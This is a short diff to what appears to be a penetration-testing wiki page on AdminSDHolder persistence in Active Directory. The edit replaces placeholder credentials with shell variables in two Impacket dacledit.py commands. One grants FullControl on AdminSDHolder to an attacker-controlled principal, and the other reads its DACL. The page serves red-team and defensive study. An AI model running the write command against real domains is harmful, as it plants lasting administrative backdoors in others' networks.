@@ -52,13 +52,13 @@ From UNIX-like systems, this can be done with [Impacket](https://github.com/Secu
 
 
 ```bash
-dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
 AdminSdHolder's DACL can then be inspected with the same utility.
 
 ```bash
-dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
 
